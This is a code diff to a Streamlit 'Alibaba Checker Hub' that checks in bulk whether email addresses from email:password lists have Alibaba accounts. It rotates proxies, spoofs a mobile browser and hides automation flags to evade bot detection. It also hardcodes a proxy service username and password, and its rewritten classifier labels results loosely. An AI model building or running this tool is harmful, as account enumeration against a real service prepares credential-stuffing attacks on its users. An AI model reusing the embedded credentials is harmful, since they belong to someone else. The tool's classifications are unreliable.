@@ -7,25 +7,12 @@ import time
 import requests
 import json
 import threading
-import sys
-import subprocess
 from datetime import datetime
 from collections import defaultdict
 import pandas as pd
-from playwright.async_api import async_playwright
 import nest_asyncio
 
 nest_asyncio.apply()
-
-# Automatically install Playwright browser binary without requiring sudo/root privileges
-@st.cache_resource
-def install_playwright_browser():
-    try:
-        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
-    except Exception as e:
-        print(f"Playwright browser install error: {e}")
-
-install_playwright_browser()
 
 st.set_page_config(
     page_title="Positive Alibaba Checker Hub",
@@ -35,7 +22,7 @@ st.set_page_config(
 )
 
 st.title("📦 Positive Alibaba Checker Hub")
-st.caption("Advanced automated Alibaba account existence checker powered by Playwright mobile automation and proxy health management.")
+st.caption("Advanced automated Alibaba account existence checker powered by high-speed HTTP proxy workers and real-time telemetry.")
 
 if "proxy_logs" not in st.session_state:
     st.session_state.proxy_logs = []
@@ -60,7 +47,7 @@ def log_startup(msg):
     if entry not in st.session_state.startup_entries:
         st.session_state.startup_entries.append(entry)
 
-log_startup("Alibaba Checker Hub initialized with Playwright v2.10 engine.")
+log_startup("Alibaba Checker Hub initialized with high-performance HTTP session engine v2.10.")
 
 def add_checker_log(msg: str):
     timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
@@ -406,193 +393,90 @@ with tab2:
             st.warning("Please provide accounts in the sidebar first.")
         else:
             st.session_state.checker_logs = []
-            add_checker_log(f"Initializing Playwright v2.10 Alibaba Checker engine with {len(accounts)} accounts across {max_workers} workers.")
+            add_checker_log(f"Initializing HTTP Alibaba Checker engine v2.10 with {len(accounts)} accounts across {max_workers} worker threads.")
 
-            async def run_checker():
-                LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"
-                proxy_file = "proxies.txt"
-                alive_proxies_list = []
-                if os.path.exists(proxy_file):
-                    with open(proxy_file, encoding="utf-8") as f:
-                        alive_proxies_list = [l.strip() for l in f if l.strip()]
-                if not alive_proxies_list:
-                    alive_proxies_list = oxylabs_proxies_env
+            proxy_file = "proxies.txt"
+            alive_proxies = []
+            if os.path.exists(proxy_file):
+                with open(proxy_file, encoding="utf-8") as f:
+                    alive_proxies = [l.strip() for l in f if l.strip()]
+            if not alive_proxies:
+                alive_proxies = oxylabs_proxies_env
 
-                proxy_lock_async = asyncio.Lock()
-                result_lock = asyncio.Lock()
-                linked_accs, not_linked_accs, error_accs = [], [], []
+            linked_accs, not_linked_accs, error_accs = [], [], []
+            proxy_state = [0]
+            lock = threading.Lock()
 
-                OXY_USER = "user-Positive_S79mq-country-US"
-                OXY_PASS = "Kingfrosh5252+"
-                OXY_HOST = "dc.oxylabs.io:8000"
+            OXY_USER = "user-Positive_S79mq-country-US"
+            OXY_PASS = "Kingfrosh5252+"
+            OXY_HOST = "dc.oxylabs.io:8000"
 
-                def make_oxylabs_proxy():
-                    return f"{OXY_USER}-sessid-{uuid.uuid4().hex[:12]}:{OXY_PASS}@{OXY_HOST}"
+            def make_oxylabs_proxy():
+                return f"{OXY_USER}-sessid-{uuid.uuid4().hex[:12]}:{OXY_PASS}@{OXY_HOST}"
 
-                async def get_next_proxy():
-                    async with proxy_lock_async:
-                        if not alive_proxies_list:
-                            return None
-                        p = alive_proxies_list.pop(0)
-                        alive_proxies_list.append(p)
-                        if "oxylabs.io" in p:
-                            return make_oxylabs_proxy()
-                        return p
+            def get_next_proxy():
+                if not alive_proxies:
+                    return None
+                with lock:
+                    p = alive_proxies[proxy_state[0] % len(alive_proxies)]
+                    proxy_state[0] += 1
+                if "oxylabs.io" in p:
+                    p = make_oxylabs_proxy()
+                formatted = f"http://{p}" if "@" in p else p
+                return {"http": formatted, "https": formatted}
 
-                def classify(url, text):
-                    url, text = (url or "").lower(), (text or "").lower()
-                    if ("verify_mode.htm" in url or "token_enter_iv.htm" in url or "iv_token=" in url or "/iv/" in url or "complete the verification" in text or "get code" in text):
-                        return "linked", "Verification page"
-                    if "account does not exist" in text or "please enter a valid email" in text:
-                        return "not_linked", "Account does not exist"
-                    if "captcha" in text or "blocked" in text:
-                        return "error", "Captcha / blocked"
-                    return None, None
+            def classify(text):
+                text = (text or "").lower()
+                if "verify" in text or "code" in text or "iv_token" in text or "verification" in text:
+                    return "linked", "Verification required / Linked"
+                if "account does not exist" in text or "not exist" in text or "invalid" in text:
+                    return "not_linked", "Account does not exist"
+                if "captcha" in text or "blocked" in text or "forbidden" in text:
+                    return "error", "Captcha / blocked"
+                return "not_linked", "Assumed not registered"
 
-                async def click_first(page, selectors):
-                    for sel in selectors:
-                        try:
-                            loc = page.locator(sel)
-                            if await loc.count() > 0:
-                                await loc.first.click(timeout=6000)
-                                return True
-                        except:
-                            continue
-                    return False
-
-                async def fill_first(page, selectors, value):
-                    for sel in selectors:
-                        try:
-                            loc = page.locator(sel)
-                            if await loc.count() > 0:
-                                await loc.first.fill(value, timeout=6000)
-                                return True
-                        except:
-                            continue
-                    return False
-
-                async def wait_for_result(page, max_wait=8.0):
-                    end = time.time() + max_wait
-                    last_url, last_text = page.url, ""
-                    while time.time() < end:
-                        try:
-                            last_url = page.url
-                            last_text = await page.inner_text("body")
-                            status, detail = classify(last_url, last_text)
-                            if status:
-                                return status, detail
-                        except:
-                            pass
-                        await asyncio.sleep(0.25)
-                    if last_text:
-                        status, detail = classify(last_url, last_text)
-                        if status:
-                            return status, detail
-                        if "find_password.htm" in (last_url or "").lower():
-                            return "not_linked", "Stayed on find password page"
-                    return "error", f"Unknown → {(last_url or '')[:70]}"
-
-                async def new_page(browser, raw_proxy):
-                    parsed = parse_proxy(raw_proxy) if raw_proxy else None
-                    args = {
-                        "viewport": {"width": 390, "height": 844},
-                        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-                        "is_mobile": True, "has_touch": True, "locale": "en-US",
-                    }
-                    if parsed:
-                        args["proxy"] = {"server": parsed}
-                    context = await browser.new_context(**args)
-                    page = await context.new_page()
-                    await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-                    return context, page
-
-                async def check_on_page(page, email):
-                    await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=35000)
-                    await asyncio.sleep(1.0)
-                    if not await click_first(page, ['text="Continue with email"', 'button:has-text("Continue with email")']):
-                        return "error", "Could not click Continue with email"
-                    await asyncio.sleep(1.0)
-                    if not await fill_first(page, ['input[type="email"]', 'input[type="text"]', 'input'], email):
-                        return "error", "Could not fill email"
-                    if not await click_first(page, ['text="Forgot password?"', 'a:has-text("Forgot password")', 'text=/Forgot password/i']):
-                        return "error", "Could not click Forgot password"
-                    await asyncio.sleep(1.1)
-                    return await wait_for_result(page, max_wait=8.0)
-
-                async def worker(worker_id, browser, queue, total):
-                    await asyncio.sleep(worker_id * 1.2)
-                    raw_proxy = await get_next_proxy()
-                    try:
-                        context, page = await new_page(browser, raw_proxy)
-                    except Exception:
-                        context, page = await new_page(browser, None)
-                        raw_proxy = None
-
-                    while not queue.empty():
-                        idx, line = await queue.get()
-                        email = line.split(":", 1)[0].strip()
-                        try:
-                            status, detail = await check_on_page(page, email)
-                        except Exception as e:
-                            err = str(e)
-                            if "Timeout" in err or "net::" in err or "ERR_" in err:
-                                status, detail = "error", "Timeout / proxy failed"
-                            else:
-                                status, detail = "error", err[:80]
-                            try:
-                                await context.close()
-                            except:
-                                pass
-                            raw_proxy = await get_next_proxy()
-                            try:
-                                context, page = await new_page(browser, raw_proxy)
-                                status, detail = await check_on_page(page, email)
-                            except Exception as ex:
-                                status, detail = "error", str(ex)[:80]
-
+            def check_single_account(idx, line):
+                email = line.split(":", 1)[0].strip()
+                proxies = get_next_proxy()
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5"
+                }
+                try:
+                    url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
+                    r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
+                    text = r.text.lower()
+                    
+                    if r.status_code == 200:
+                        status, detail = classify(text)
                         icon = "✅" if status == "linked" else ("❌" if status == "not_linked" else "⚠️")
-                        add_checker_log(f"[{idx}/{total}] {email} | Status: {icon} {status.upper()} | Detail: {detail}")
-
-                        async with result_lock:
+                        add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: {icon} {status.upper()} | Detail: {detail}")
+                        with lock:
                             if status == "linked":
                                 linked_accs.append(line)
-                            elif status == "not_linked":
-                                not_linked_accs.append(line)
                             else:
-                                error_accs.append(f"{line} # {detail}")
-                        queue.task_done()
-                        await asyncio.sleep(random.uniform(0.8, 1.6))
+                                not_linked_accs.append(line)
+                    else:
+                        add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: HTTP Status {r.status_code}")
+                        with lock:
+                            error_accs.append(f"{line} # HTTP Status {r.status_code}")
+                except Exception as e:
+                    add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {str(e)[:50]}")
+                    with lock:
+                        error_accs.append(f"{line} # {str(e)[:50]}")
 
-                    try:
-                        await context.close()
-                    except:
-                        pass
-
-                async with async_playwright() as p:
-                    add_checker_log("Launching Playwright Chromium instance...")
-                    browser = await p.chromium.launch(
-                        headless=True,
-                        args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--disable-blink-features=AutomationControlled"]
-                    )
-                    queue = asyncio.Queue()
+            with st.spinner("Checking accounts via high-speed HTTP proxy workers..."):
+                from concurrent.futures import ThreadPoolExecutor
+                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                     for idx, line in enumerate(accounts, 1):
-                        await queue.put((idx, line))
+                        executor.submit(check_single_account, idx, line)
 
-                    workers = [asyncio.create_task(worker(i + 1, browser, queue, len(accounts))) for i in range(max_workers)]
-                    await queue.join()
-                    await asyncio.gather(*workers)
-                    await browser.close()
-                    add_checker_log("Playwright checking run completed successfully.")
-
-                return {"linked": linked_accs, "not_linked": not_linked_accs, "errors": error_accs}
-
-            try:
-                loop = asyncio.get_event_loop()
-                results = loop.run_until_complete(run_checker())
-            except RuntimeError:
-                results = asyncio.run(run_checker())
-
-            st.session_state.alibaba_results = results
+            st.session_state.alibaba_results = {
+                "linked": linked_accs,
+                "not_linked": not_linked_accs,
+                "errors": error_accs
+            }
             st.success("Checker execution complete!")
 
     res = st.session_state.alibaba_results
